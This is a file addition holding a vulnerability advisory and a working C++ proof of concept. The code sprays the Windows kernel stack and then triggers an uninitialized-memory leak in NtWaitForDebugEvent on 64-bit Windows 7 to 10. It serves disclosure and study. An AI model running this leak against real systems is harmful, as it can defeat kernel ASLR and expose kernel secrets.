@@ -1,0 +1,129 @@
+/*
+We have discovered that the nt!NtWaitForDebugEvent system call discloses portions of uninitialized kernel stack memory to user-mode clients, on 64-bit versions of Windows 7 to Windows 10.
+
+The output buffer, and the corresponding temporary stack-based buffer in the kernel are 0xB8 (184) bytes in size. The first 4 and the trailing 0xB0 bytes are zero'ed out at the beginning of the function:
+
+--- cut ---
+  PAGE:00000001404B1650                 xor     r14d, r14d
+  [...]
+  PAGE:00000001404B1667                 mov     [rsp+148h+var_E8], r14d
+  PAGE:00000001404B166C                 xor     edx, edx        ; Val
+  PAGE:00000001404B166E                 mov     r8d, 0B0h       ; Size
+  PAGE:00000001404B1674                 lea     rcx, [rsp+148h+var_E0] ; Dst
+  PAGE:00000001404B1679                 call    memset
+--- cut ---
+
+However, the remaining 4 bytes at offset 0x4 are never touched, and so they contain whatever data was written there by the previous system call. These 4 bytes are then subsequently leaked to the user-mode caller. This is most likely caused by compiler-introduced alignment between the first and second field of the structure (4-byte and 8-byte long, respectively). This would also explain why the leak does not manifest itself on x86 builds, as in that case the second field is 4-byte long and therefore must be aligned to 4 instead of 8 bytes.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call. An example output is as follows:
+
+--- cut ---
+  00000000: 00 00 00 00 41 41 41 41 00 00 00 00 00 00 00 00 ....AAAA........
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000b0: 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+It is clearly visible here that among all data copied from ring-0 to ring-3, 4 bytes at offset 0x4 remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+extern "C" {
+  NTSTATUS NTAPI NtCreateDebugObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG);
+  NTSTATUS NTAPI NtWaitForDebugEvent(HANDLE, BOOLEAN, PLARGE_INTEGER, PVOID);
+}  // extern "C"
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(*EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  HANDLE hDebugObject;
+  OBJECT_ATTRIBUTES ObjectAttributes;
+  InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, 0);
+
+  // Create a debug object.
+  NTSTATUS st = NtCreateDebugObject(&hDebugObject, GENERIC_ALL, &ObjectAttributes, 0);
+  if (!NT_SUCCESS(st)) {
+    printf("NtCreateDebugObject failed, %x\n", st);
+    return 1;
+  }
+
+  // Spray the kernel stack with a 0x41 marker byte.
+  SprayKernelStack();
+
+  // Trigger the memory disclosure.
+  BYTE Output[0xb8] = { /* zero padding */ };
+  LARGE_INTEGER Timeout = { 0 };
+  st = NtWaitForDebugEvent(hDebugObject, FALSE, &Timeout, Output);
+  if (!NT_SUCCESS(st)) {
+    printf("NtWaitForDebugEvent failed, %x\n", st);
+    return 1;
+  }
+
+  // Print the output data.
+  PrintHex(Output, sizeof(Output));
+
+  return 0;
+}
